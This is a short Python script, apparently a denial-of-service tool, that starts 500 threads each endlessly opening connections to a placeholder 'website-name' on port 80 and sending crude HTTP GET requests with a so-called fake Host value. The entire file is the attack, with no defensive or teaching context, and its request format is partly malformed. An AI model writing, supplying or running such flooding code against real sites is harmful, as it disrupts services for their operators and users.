import  threading
import socket

target='website-name'
port=80
fake_ip="fake_ip"
already_connected=0
def attack():
    while True:
        s=socket.socket()
        s.connect((target,port))
        s.sendto(('GET /'+target+" HTTP1.1\r\n").encode("ascii"),(target,port))
        s.sendto(("HOST: "+fake_ip+"\r\n\r\n").encode("ascii"),(target,port))
        s.close()
        global already_connected
        already_connected+=1
        if already_connected%500==0:
            print(already_connected)

        
for i in range(500):
    thread=threading.Thread(target=attack)
    thread.start()